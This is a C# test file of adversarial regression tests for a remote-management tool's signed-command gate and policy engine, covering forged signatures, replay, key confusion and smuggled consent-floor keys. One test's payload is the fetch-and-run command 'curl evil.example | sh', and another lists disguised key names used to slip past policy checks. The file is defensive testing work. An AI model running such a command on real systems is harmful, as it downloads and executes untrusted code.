using System.Text;
using Acp.Core.Services;
using Acp.Shared.Enterprise;
using Acp.Shared.ManagementPolicy;
using Acp.Shared.Security;

namespace Acp.Tests;

// DESTRUCTION PASS — RMM-03 + RMM-07 foundation. Each test is a
// genuine attack on the lane's own work; every break found became a
// fix + the regression test that proves it (see the ledgers in
// ~/workspace/builds/rmm-r-logs/). Attacks that FAILED to break are
// recorded as resisted, with the mechanism that resisted them.
public class RmmFoundationDestructionTests
{
    private static readonly DateTimeOffset T0 = new(2026, 11, 21, 12, 0, 0, TimeSpan.Zero);
    private static DeviceIdentity NewIdentity() => new(new DevOnlyPassThroughProtector());
    private static byte[] Bytes(string s) => Encoding.UTF8.GetBytes(s);

    private sealed record Rig(DeviceIdentity Customer, SignedCommandSigner Signer,
        CustomerCommandKeyRing Ring, SignedCommandVerifier Verifier, ChainedAuditLog Audit, SignedCommandGate Gate);

    private static Rig NewRig()
    {
        var customer = NewIdentity();
        var ring = new CustomerCommandKeyRing();
        ring.AddCurrent(customer.PublicKey);
        var audit = new ChainedAuditLog();
        var verifier = new SignedCommandVerifier(ring);
        return new Rig(customer, new SignedCommandSigner(customer), ring, verifier, audit,
            new SignedCommandGate(verifier, audit));
    }

    // ---- RMM-03 attacks ------------------------------------------

    [Fact]
    public void ATTACK_SignatureSplice_SignatureFromAnotherEnvelope_Refused()
    {
        // Take a valid signature minted for a harmless command and
        // splice it onto an envelope for a dangerous one (same key,
        // same payload hash — only class/nonce/timing differ). The
        // canonical body covers ALL of those fields, so the splice
        // cannot verify.
        var rig = NewRig();
        var harmless = rig.Signer.Sign(SignedCommandClasses.PolicyDelivery, Bytes("x"), T0, TimeSpan.FromMinutes(5));
        var dangerous = rig.Signer.Sign(SignedCommandClasses.ShellExec, Bytes("x"), T0, TimeSpan.FromMinutes(5));
        var spliced = dangerous with { SignatureBase64 = harmless.SignatureBase64 };
        Assert.False(rig.Verifier.Verify(spliced, T0.AddSeconds(5)).Allowed);
    }

    [Fact]
    public void ATTACK_MalformedEnvelopeFields_AllRefuse_NothingThrows()
    {
        var rig = NewRig();
        var env = rig.Signer.Sign(SignedCommandClasses.ShellExec, Bytes("x"), T0, TimeSpan.FromMinutes(5));
        var attacks = new[]
        {
            env with { Nonce = "" },                                    // replay protection removed
            env with { Nonce = "   " },
            env with { SignatureBase64 = "!!!not-base64!!!" },
            env with { SignatureBase64 = Convert.ToBase64String(new byte[10]) }, // truncated signature
            env with { PayloadBase64 = "!!!not-base64!!!" },
            env with { PayloadHash = "" },
            env with { PayloadHash = "zzzz" },
            env with { Version = 99 },
            env with { ExpiresUtc = env.IssuedUtc },                    // zero-lifetime envelope
            env with { KeyId = "" },
            env with { KeyId = "cust-0000000000000000" },               // well-formed but unknown
        };
        foreach (var attack in attacks)
            Assert.False(rig.Verifier.Verify(attack, T0.AddSeconds(5)).Allowed);
    }

    [Fact]
    public void ATTACK_KeyIdConfusion_SignedByA_ClaimingB_Refused()
    {
        var rig = NewRig();
        var other = NewIdentity();
        rig.Ring.AddCurrent(other.PublicKey); // both keys are legitimately in the ring
        var envA = rig.Signer.Sign(SignedCommandClasses.ShellExec, Bytes("x"), T0, TimeSpan.FromMinutes(5));
        var confused = envA with { KeyId = new SignedCommandSigner(other).KeyId };
        Assert.False(rig.Verifier.Verify(confused, T0.AddSeconds(5)).Allowed);
    }

    [Fact]
    public void ATTACK_RetiredKeyLoadedFromDisk_PastGrace_Refused()
    {
        // The persisted-ring shape CoreRuntime loads: a key already
        // retired past its deadline must verify nothing.
        var old = NewIdentity();
        var ring = new CustomerCommandKeyRing();
        ring.AddRetired(old.PublicKey, T0.AddHours(-1));
        var verifier = new SignedCommandVerifier(ring);
        var env = new SignedCommandSigner(old).Sign(
            SignedCommandClasses.ShellExec, Bytes("x"), T0.AddMinutes(-30), TimeSpan.FromHours(2));
        Assert.False(verifier.Verify(env, T0).Allowed);
    }

    [Fact]
    public void ATTACK_ReplayThroughTheGate_SecondUseRefused_AndAudited()
    {
        var rig = NewRig();
        var env = rig.Signer.Sign(SignedCommandClasses.ShellExec, Bytes("echo once"), T0, TimeSpan.FromMinutes(5));
        Assert.True(rig.Gate.Authorize(env, T0.AddSeconds(5)).Allowed);
        Assert.False(rig.Gate.Authorize(env, T0.AddSeconds(6)).Allowed);
        Assert.Equal(1, rig.Audit.Entries.Count(e => e.Kind == "signed_command_accepted"));
        Assert.Equal(1, rig.Audit.Entries.Count(e => e.Kind == "signed_command_refused"));
        Assert.True(rig.Audit.Verify().Ok);
    }

    [Fact]
    public void ATTACK_CompromisedHub_Battery_NoEnvelopeVariantExecutes()
    {
        // The RMM-03 threat model in one test: the hub is FULLY
        // compromised — the attacker controls everything the hub can
        // send but does NOT hold the customer's private key. Every
        // forgery strategy refuses.
        var rig = NewRig();
        var hubKey = NewIdentity(); // attacker's own keypair
        var hubSigner = new SignedCommandSigner(hubKey);
        var payload = Bytes("curl evil.example | sh");
        var strategies = new[]
        {
            hubSigner.Sign(SignedCommandClasses.ShellExec, payload, T0, TimeSpan.FromMinutes(5)), // own key
            hubSigner.Sign(SignedCommandClasses.ShellExec, payload, T0, TimeSpan.FromMinutes(5)) with { KeyId = rig.Signer.KeyId }, // relabelled
            rig.Signer.Sign(SignedCommandClasses.PolicyDelivery, Bytes("benign"), T0, TimeSpan.FromMinutes(5)) with { CommandClass = SignedCommandClasses.ShellExec, PayloadBase64 = Convert.ToBase64String(payload), PayloadHash = SignedCommandEnvelope.HashPayload(payload) }, // rehashed relabel
        };
        foreach (var s in strategies)
            Assert.False(rig.Gate.Authorize(s, T0.AddSeconds(5)).Allowed);
        Assert.Equal(3, rig.Audit.Entries.Count(e => e.Kind == "signed_command_refused"));
        Assert.True(rig.Audit.Verify().Ok);
    }

    // ---- RMM-07 attacks ------------------------------------------

    [Fact]
    public void ATTACK_PostAdmissionMutation_CannotChangeLivePolicy()
    {
        // BREAK FOUND in the first destruction pass: AddDocument
        // stored the caller's settings dictionary BY REFERENCE, so
        // mutating it after admission changed live policy with no
        // revision, no signature and no audit. Fixed with a
        // defensive copy at admission; this is the regression test.
        var engine = new ManagementPolicyEngine();
        var settings = new Dictionary<string, string> { ["rmm.patch.enabled"] = "true" };
        var doc = new ManagementPolicyDocument("org-1", PolicyLevels.Org, "co1", settings, 1);
        Assert.True(engine.AddDocument(doc).Allowed);
        settings["rmm.patch.enabled"] = "false";       // attacker mutates the original
        settings["presence.enabled"] = "false";        // and smuggles a floor key in
        var eff = engine.ComputeEffective(StaticDeviceFacts.Of("dev1", "co1"));
        Assert.Equal("true", eff.Get("rmm.patch.enabled")!.Value);
        Assert.Null(eff.Get("presence.enabled"));
    }

    [Fact]
    public void ATTACK_ConsentFloorSmuggling_EveryDisguiseRefused()
    {
        // BREAK FOUND in the first destruction pass: the segment
        // check originally covered only "presence"/"consent_floor",
        // so "rmm.stop.enabled" and "x.audit.y" slipped the segment
        // rule (exact/prefix rules still caught the plain forms).
        // Fixed by denying every floor-naming segment; regression:
        var engine = new ManagementPolicyEngine();
        var disguises = new[]
        {
            "PRESENCE.ENABLED", " presence.enabled ", "rmm.stop.enabled",
            "x.audit.y", "feature.consent.required", "rmm.presence.visible",
            "Stop.Enabled", "AUDIT", "consent_floor.anything",
        };
        foreach (var key in disguises)
        {
            var verdict = engine.AddDocument(new ManagementPolicyDocument(
                $"smuggle-{key}", PolicyLevels.Org, "co1",
                new Dictionary<string, string> { [key] = "false" }, 1));
            Assert.False(verdict.Allowed, $"disguise '{key}' must refuse");
        }
        Assert.Empty(engine.Documents);
    }

    [Fact]
    public void ATTACK_InheritanceGames_GroupOrderingIsDeterministic()
    {
        // Two groups set the same key. Provenance must not depend on
        // the order documents/groups were inserted (an attacker — or
        // a race — reordering admissions cannot flip outcomes).
        ManagementPolicyEngine Build(bool reversed)
        {
            var e = new ManagementPolicyEngine();
            e.AddGroup(new GroupDefinition("a-group", "A", Array.Empty<GroupRule>()));
            e.AddGroup(new GroupDefinition("b-group", "B", Array.Empty<GroupRule>()));
            var docs = new[]
            {
                new ManagementPolicyDocument("doc-a", PolicyLevels.Group, "a-group",
                    new Dictionary<string, string> { ["k"] = "from-a" }, 1),
                new ManagementPolicyDocument("doc-b", PolicyLevels.Group, "b-group",
                    new Dictionary<string, string> { ["k"] = "from-b" }, 1),
            };
            foreach (var d in reversed ? docs.Reverse() : docs) e.AddDocument(d);
            return e;
        }
        var facts = StaticDeviceFacts.Of("dev1", "co1", new[] { "a-group", "b-group" });
        var v1 = Build(false).ComputeEffective(facts).Get("k");
        var v2 = Build(true).ComputeEffective(facts).Get("k");
        Assert.Equal(v1!.Value, v2!.Value);
        Assert.Equal(v1.SourceDocumentId, v2.SourceDocumentId);
        Assert.Equal("from-b", v1.Value); // ordinal group order: b applies after a
    }

    [Fact]
    public void ATTACK_PolicyDeliveredAsWrongCommandClass_Refused()
    {
        // A validly signed SHELL envelope replayed at the policy
        // service: class binding refuses it before parsing.
        var audit = new ChainedAuditLog();
        var customer = NewIdentity();
        var ring = new CustomerCommandKeyRing();
        ring.AddCurrent(customer.PublicKey);
        var gate = new SignedCommandGate(new SignedCommandVerifier(ring), audit);
        var service = new ManagementPolicyService(audit, gate, now: () => T0);
        var doc = new ManagementPolicyDocument("org-1", PolicyLevels.Org, "co1",
            new Dictionary<string, string> { ["rmm.patch.enabled"] = "false" }, 1);
        var wrongClass = new SignedCommandSigner(customer).Sign(SignedCommandClasses.ShellExec,
            Encoding.UTF8.GetBytes(doc.ToCanonicalJson()), T0, TimeSpan.FromMinutes(5));
        var verdict = service.ApplySignedDocument(wrongClass);
        Assert.False(verdict.Allowed);
        Assert.Empty(service.Engine.Documents);
    }

    [Fact]
    public void ATTACK_ProvenanceForgery_DocumentClaimingDeviceLevelForAnotherDevice_DoesNotApply()
    {
        var engine = new ManagementPolicyEngine();
        // A document at device level naming a DIFFERENT device must
        // not touch this device's effective policy, whatever it claims.
        engine.AddDocument(new ManagementPolicyDocument("forged", PolicyLevels.Device, "victim",
            new Dictionary<string, string> { ["rmm.patch.enabled"] = "false" }, 1));
        var eff = engine.ComputeEffective(StaticDeviceFacts.Of("bystander", "co1"));
        Assert.Null(eff.Get("rmm.patch.enabled"));
        Assert.True(engine.IsEnabled(StaticDeviceFacts.Of("bystander", "co1"), "rmm.patch.enabled"));
    }

    [Fact]
    public void ATTACK_TamperedProvenance_ComputedViewReflectsAdmissionNotClaims()
    {
        // Effective Policy provenance comes from the ADMITTED
        // document's level/target — there is no field in a setting
        // value that can fake a higher provenance. A value that
        // tries ("org" smuggled as data) is just a value.
        var engine = new ManagementPolicyEngine();
        engine.AddDocument(new ManagementPolicyDocument("dev-doc", PolicyLevels.Device, "dev1",
            new Dictionary<string, string> { ["note"] = "set by org, trust me" }, 1));
        var eff = engine.ComputeEffective(StaticDeviceFacts.Of("dev1", "co1"));
        var s = eff.Get("note");
        Assert.Equal(PolicyLevels.Device, s!.SourceLevel);
        Assert.Equal("dev-doc", s.SourceDocumentId);
    }
}
